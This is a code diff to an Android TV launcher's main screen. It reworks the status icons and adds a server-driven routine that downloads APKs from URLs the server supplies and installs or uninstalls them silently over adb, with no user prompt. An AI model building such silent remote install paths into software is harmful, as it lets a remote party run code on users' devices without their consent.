@@ -6,6 +6,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.hardware.usb.UsbDevice;
 import android.hardware.usb.UsbManager;
 import android.os.Bundle;
@@ -28,6 +30,7 @@ import androidx.leanback.widget.HorizontalGridView;
 import androidx.leanback.widget.ItemBridgeAdapter;
 import androidx.leanback.widget.VerticalGridView;
 import androidx.recyclerview.widget.GridLayoutManager;
+import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
 import com.google.android.material.appbar.AppBarLayout;
@@ -35,7 +38,6 @@ import com.google.gson.Gson;
 import com.google.gson.stream.JsonReader;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.callback.FileCallback;
-import com.lzy.okgo.model.Response;
 import com.open.system.SystemUtils;
 import com.soya.launcher.App;
 import com.soya.launcher.BuildConfig;
@@ -44,6 +46,7 @@ import com.soya.launcher.adapter.AdsAdapter;
 import com.soya.launcher.adapter.AppListAdapter;
 import com.soya.launcher.adapter.MainContentAdapter;
 import com.soya.launcher.adapter.MainHeaderAdapter;
+import com.soya.launcher.adapter.NotifyAdapter;
 import com.soya.launcher.adapter.SettingAdapter;
 import com.soya.launcher.adapter.StoreAdapter;
 import com.soya.launcher.bean.Ads;
@@ -54,6 +57,7 @@ import com.soya.launcher.bean.Movice;
 import com.soya.launcher.bean.MoviceData;
 import com.soya.launcher.bean.MoviceList;
 import com.soya.launcher.bean.MyRunnable;
+import com.soya.launcher.bean.Notify;
 import com.soya.launcher.bean.Projector;
 import com.soya.launcher.bean.PushApp;
 import com.soya.launcher.bean.SettingItem;
@@ -71,6 +75,7 @@ import com.soya.launcher.http.ServiceRequest;
 import com.soya.launcher.http.Url;
 import com.soya.launcher.http.response.AppListResponse;
 import com.soya.launcher.http.response.HomeResponse;
+import com.soya.launcher.http.response.PushResponse;
 import com.soya.launcher.http.response.VersionResponse;
 import com.soya.launcher.manager.FilePathMangaer;
 import com.soya.launcher.manager.PreferencesManager;
@@ -105,10 +110,12 @@ import java.util.List;
 import java.util.Map;
 import java.util.Set;
 import java.util.UUID;
+import java.util.concurrent.CopyOnWriteArrayList;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
+import okhttp3.Response;
 import retrofit2.Call;
 
 public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetChangedListener, View.OnClickListener {
@@ -140,11 +147,9 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
     private TextView mSegmentView;
     private View mHelpView;
     private TextView mTestView;
+    private RecyclerView mNotifyRecycler;
 
-    private View mBluetoothView;
-    private View mSdCardView;
-    private View mAPView;
-
+    private NotifyAdapter mNotifyAdapter;
     private Handler uiHandler;
     private String uuid;
     private Call call;
@@ -154,10 +159,12 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
     private final List<TypeItem> items = new ArrayList<>();
     private final List<TypeItem> targetMenus = new ArrayList<>();
     private MyRunnable timeRunnable;
+    private MyRunnable installRunnable;
+    private MyRunnable uninstallRunnable;
     private boolean isConnectFirst = false;
     private boolean isNetworkAvailable;
     private long lastWeatherTime = -1;
-    private long lastCheckPushApk = -1;
+    private long lastCheckPushTime = System.currentTimeMillis();
 
     @Override
     public void onCreate(@Nullable Bundle savedInstanceState) {
@@ -265,15 +272,14 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
         mTimeView = view.findViewById(R.id.loop_time);
         mHelpView = view.findViewById(R.id.help);
         mTestView = view.findViewById(R.id.test);
-        mBluetoothView = view.findViewById(R.id.bluetooth);
-        mSdCardView = view.findViewById(R.id.sd_card);
-        mAPView = view.findViewById(R.id.ap);
+        mNotifyRecycler = view.findViewById(R.id.notify_recycler);
 
         mHorizontalContentGrid.addItemDecoration(new HSlideMarginDecoration(getResources().getDimension(R.dimen.margin_decoration_max), getResources().getDimension(R.dimen.margin_decoration_min)));
         mHeaderGrid.addItemDecoration(new HSlideMarginDecoration(getResources().getDimension(R.dimen.margin_decoration_max), getResources().getDimension(R.dimen.margin_decoration_min)));
 
         mHeaderGrid.setPivotY(maxVerticalOffset);
         mTestView.setText("CHIHI Test Version: "+BuildConfig.VERSION_NAME);
+        mNotifyAdapter = new NotifyAdapter(getActivity(), inflater, new CopyOnWriteArrayList<>(), Config.COMPANY == 3 ? R.layout.holder_notify : R.layout.holder_notify_2);
     }
 
     @Override
@@ -287,18 +293,96 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
         mWifiView.setOnClickListener(this);
         mLoginView.setOnClickListener(this);
         mHelpView.setOnClickListener(this);
-        mBluetoothView.setOnClickListener(this);
     }
 
     @Override
     protected void initBind(View view, LayoutInflater inflater){
         super.initBind(view, inflater);
         fillHeader();
+        mNotifyRecycler.setLayoutManager(new LinearLayoutManager(getActivity(), RecyclerView.HORIZONTAL, false));
+        mNotifyRecycler.setAdapter(mNotifyAdapter);
     }
 
     @Override
     protected int getWallpaperView() {
         return R.id.wallpaper;
+    }
+
+    private void doPushApp(){
+        PushApp bean = App.PUSH_APPS.isEmpty() ? null : App.PUSH_APPS.remove(0);
+        if (bean == null || !isAdded()) return;
+
+        if (bean.getInstallFlag()){
+            try {
+                PackageManager pm = getActivity().getPackageManager();
+                List<ResolveInfo> infos = AndroidSystem.queryCategoryAllLauncher(getActivity());
+                boolean caInstall = true;
+                for (ResolveInfo info : infos) {
+                    if (info.activityInfo.packageName.equals(bean.getPackageName()) && pm.getPackageInfo(bean.getPackageName(), 0).versionName.equals(bean.getVersion())){
+                        caInstall = false;
+                        break;
+                    }
+                }
+                if (caInstall){
+                    downloadApk(bean);
+                }else {
+                    doPushApp();
+                }
+            }catch (Exception e){
+                doPushApp();
+            }
+        }else {
+            silentUninstall(bean.getPackageName());
+        }
+    }
+
+    private void downloadApk(PushApp bean){
+        OkGo.get(bean.getUrl()).execute(new FileCallback() {
+            @Override
+            public void onError(okhttp3.Call call, Response response, Exception e) {
+                doPushApp();
+            }
+
+            @Override
+            public void onSuccess(File file, okhttp3.Call call, Response response) {
+                silentInstall(file);
+            }
+        });
+    }
+
+    private void silentUninstall(final String packageName){
+        if (uninstallRunnable != null) uninstallRunnable.interrupt();
+        uninstallRunnable = new MyRunnable() {
+            @Override
+            public void run() {
+                try {
+                    AppUtils.adbUninstallApk(packageName);
+                }catch (Exception e){
+                    e.printStackTrace();
+                }finally {
+                    doPushApp();
+                }
+            }
+        };
+        exec.execute(uninstallRunnable);
+    }
+
+    private void silentInstall(final File file){
+        if (installRunnable != null) installRunnable.interrupt();
+        installRunnable = new MyRunnable() {
+            @Override
+            public void run() {
+                try {
+                    AppUtils.adbInstallApk(file.getAbsolutePath());
+                }catch (Exception e){
+                    e.printStackTrace();
+                }finally {
+                    if (file.exists()) file.delete();
+                    doPushApp();
+                }
+            }
+        };
+        exec.execute(installRunnable);
     }
 
     private void uidPull(){
@@ -362,10 +446,26 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
                         HttpRequest.getCityWeather(newWeatherCallback(), PreferencesManager.getCityName());
                         lastWeatherTime = System.currentTimeMillis();
                     }
+
+                    if (lastCheckPushTime != -1 && TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - lastCheckPushTime) >= 20){
+                        lastCheckPushTime = -1;
+                        HttpRequest.pushApp(newPushResponseCallback());
+                    }
                 }
             }
         };
         exec.execute(timeRunnable);
+    }
+
+    private ServiceRequest.Callback<PushResponse> newPushResponseCallback(){
+        return new ServiceRequest.Callback<PushResponse>() {
+            @Override
+            public void onCallback(Call call, int status, PushResponse result) {
+                if (call.isCanceled() || !isAdded() || result == null || result.getData() == null || result.getData().isEmpty()) return;
+                App.PUSH_APPS.addAll(result.getData());
+                doPushApp();
+            }
+        };
     }
 
     private void syncNotify(){
@@ -382,12 +482,15 @@ public class MainFragment extends AbsFragment implements AppBarLayout.OnOffsetCh
                 }else {
                     mWifiView.setImageResource(isNetworkAvailable ? R.drawable.baseline_wifi_100 : R.drawable.baseline_wifi_off_100);
                 }
-                if (Config.COMPANY != 0){
-                    mBluetoothView.setVisibility(bluetoothAdapter != null && bluetoothAdapter.isEnabled() ? View.VISIBLE : View.GONE);
-                    HashMap<String, UsbDevice> deviceHashMap = ((UsbManager) getActivity().getSystemService(Context.USB_SERVICE)).getDeviceList();
-                    mSdCardView.setVisibility(!deviceHashMap.isEmpty() ? View.VISIBLE : View.GONE);
-                    mAPView.setVisibility(SystemUtils.isApEnable(getActivity()) ? View.VISIBLE : View.GONE);
+
+                List<Notify> notifies = new ArrayList<>();
+                if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) notifies.add(new Notify(R.drawable.baseline_bluetooth_100));
+                HashMap<String, UsbDevice> deviceHashMap = ((UsbManager) getActivity().getSystemService(Context.USB_SERVICE)).getDeviceList();
+                for (int i = 0; i < deviceHashMap.size(); i++){
+                    notifies.add(new Notify(R.drawable.baseline_usb_100));
                 }
+                if (SystemUtils.isApEnable(getActivity())) notifies.add(new Notify(R.drawable.baseline_wifi_tethering_100_2));
+                mNotifyAdapter.replace(notifies);
             }
         });
     }
